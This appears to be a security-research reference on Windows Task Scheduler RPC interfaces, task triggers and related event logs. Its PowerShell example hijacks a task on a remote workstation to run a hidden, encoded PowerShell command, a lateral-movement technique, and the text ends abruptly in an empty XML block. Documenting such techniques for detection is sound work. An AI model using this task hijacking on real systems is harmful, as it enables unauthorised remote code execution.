# Task Scheduler Service
The Task Scheduler service allows you to perform automated tasks on a chosen computer. With this service, you can schedule any program to run at a convenient time for you or when a specific event occurs.
## Task Scheduler Service Remote Protocol
## ITaskSchedulerService RPC Server
The ITaskSchedulerService interface uses the **ncacn_ip_tcp** RPC protocol sequence and RPC dynamic endpoints.
### RPC Server
* **Name**: ITaskSchedulerService
* **UUID**: 86d35949-83c9-4044-b424-db363231fd0c
* **FilePath**: C:\Windows\System32\schedsvc.dll
```
InterfaceId           : 86d35949-83c9-4044-b424-db363231fd0c
InterfaceVersion      : 1.0
TransferSyntaxId      : 8a885d04-1ceb-11c9-9fe8-08002b104860
TransferSyntaxVersion : 2.0
ProcedureCount        : 20
Procedures            : {SchRpcHighestVersion, SchRpcRegisterTask, SchRpcRetrieveTask, SchRpcCreateFolder...}
Server                : UUID: 86d35949-83c9-4044-b424-db363231fd0c
ComplexTypes          : {Struct_0, Struct_1, Struct_3}
FilePath              : C:\Windows\System32\schedsvc.dll
Name                  : schedsvc.dll
Offset                : 510656
ServiceName           : Schedule
ServiceDisplayName    : Task Scheduler
IsServiceRunning      : True
Endpoints             : {[86d35949-83c9-4044-b424-db363231fd0c, 1.0] ncalrpc:[LRPC-4803de23b17986468a], [86d35949-83c9-4044-b424-db363231fd0c, 1.0] ncalrpc:[ubpmtaskhostchannel], 
                        [86d35949-83c9-4044-b424-db363231fd0c, 1.0] ncalrpc:[LRPC-83a142d94b8e74a91a]}
EndpointCount         : 3
Client                : False 
```
### RPC Clients
* taskcomp.dll
* taskschd.dll
* wmicmiplugin.dll 
### RPC Methods
* SchRpcRegisterTask (Opnum 1)- The SchRpcRegisterTask method registers a task with the server (i.e. Updates).
* SchRpcRetrieveTask (Opnum 2) - The SchRpcRetrieveTask method returns a task definition.
* SchRpcRun (Opnum 12) - The SchRpcRun method runs a task specified by a path.
## ATSvc RPC Server
When using the ATSvc interface, the Task Scheduler Remoting Protocol client and server MUST specify **ncacn_np** as the RPC protocol sequence.
The ATSvc interface uses a well-known endpoint **\PIPE\atsvc**.
### RPC Server
* **Name**: ATSvc
* **UUID**: 1ff70682-0a51-30e8-076d-740be8cee98b
* **FilePath**: C:\Windows\System32\taskcomp.dll
```
InterfaceId           : 1ff70682-0a51-30e8-076d-740be8cee98b
InterfaceVersion      : 1.0
TransferSyntaxId      : 8a885d04-1ceb-11c9-9fe8-08002b104860
TransferSyntaxVersion : 2.0
ProcedureCount        : 4
Procedures            : {NetrJobAdd, NetrJobDel, NetrJobEnum, NetrJobGetInfo}
Server                : UUID: 1ff70682-0a51-30e8-076d-740be8cee98b
ComplexTypes          : {Struct_0, Struct_1, Struct_2}
FilePath              : C:\Windows\System32\taskcomp.dll
Name                  : taskcomp.dll
Offset                : 322256
ServiceName           : 
ServiceDisplayName    : 
IsServiceRunning      : False
Endpoints             : {[1ff70682-0a51-30e8-076d-740be8cee98b, 1.0] ncalrpc:[LRPC-b858137bbb082a0e8d]}
EndpointCount         : 1
Client                : False
```
### RPC Clients
* mstask.dll
* schedcli.dll
### RPC Methods
* NetrJobAdd (Opnum 0)- The NetrJobAdd method MUST add a single AT task to the server's task store.
* NetrJobDel (Opnum 1) - The NetrJobDel method MUST delete a specified range of tasks from the task store. The method is capable of deleting all AT tasks or just a subset of the tasks, as determined by the values of the MinJobId and MaxJobId parameters.
* NetrJobEnum (Opnum 2) - The NetrJobEnum method MUST return an enumeration of all AT tasks on the specified server.
* NetrJobGetInfo (Opnum 3) - The NetrJobGetInfo method MUST return information for a specified ATSvc task. The task identifier MUST be used to locate the task configuration.
## Task Actions
* ComHandler Action - This action fires a COM handler.
* Exec Action -  This action executes a command-line operation such as starting Notepad.
* E-mail Action - This action sends an email when a task is triggered.
* Show Message Action - This action shows a message box with a specified message and title.
## Task Triggers
* TASK_TRIGGER_EVENT - 0 - Starts the task when a specific event occurs.
* TASK_TRIGGER_TIME - 1 - Starts the task at a specific time of day.
* TASK_TRIGGER_DAILY - 2 - Starts the task daily.
* TASK_TRIGGER_WEEKLY - 3 - Starts the task weekly.
* TASK_TRIGGER_MONTHLY - 4 - Starts the task monthly.
* TASK_TRIGGER_MONTHLYDOW - 5 - Starts the task every month on a specific day of the week.
* TASK_TRIGGER_IDLE - 6 - Starts the task when the computer goes into an idle state.
* TASK_TRIGGER_REGISTRATION - 7 - Starts the task when the task is registered.
* TASK_TRIGGER_BOOT - 8 - Starts the task when the computer boots.
* TASK_TRIGGER_LOGON - 9 - Starts the task when a specific user logs on.
* TASK_TRIGGER_SESSION_STATE_CHANGE - 11 - Triggers the task when a specific session state changes.
## Interact with Task Scheduler Remotely
### Powershell - Schedule.Service COM Object 
```Powershell
# connect to Task Scheduler:
$service = New-Object -ComObject Schedule.Service
$service.Connect("WORKSTATION6")
# Get task folder that contains tasks:
$folder = $service.GetFolder('\Microsoft\Windows\')
# Example: Root Task Container:
$folder = $service.GetFolder('\')
# Enumerate Specific Task
$ward0gtask = $folder.GetTask('Ward0g')
$alltasks = $folder.GetTasks(0)
# get task definition and change it (i.e Arguments)
$taskdefinition = $ward0gtask.Definition
$taskdefinition.Actions | ForEach-Object {$_.Path = "powershell"}
$taskdefinition.Actions | ForEach-Object {$_.Arguments = "-noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBFAFIAUwBpAE8ATgBUAGEAQgBMAGUALgBQAFMAVgBlAHIAUwBpAE8AbgAuAE0AY...."}
# write back changed task definition:
# 4 = Update
$folder.RegisterTaskDefinition($task.Name, $taskdefinition, 4, $null, $null, $null)
# Execute Task
$NewTask = $folder.GetTask("Ward0g")
$NewTask.run.Invoke(@(''))
# Stop Task
$NewTask.stop(0)
```
## Security Event Logs
### Security Log
* EventID 4624: Successful Logon
* EventID 4702 (Target): A Scheduled Task Was updated
```xml
-  
    -  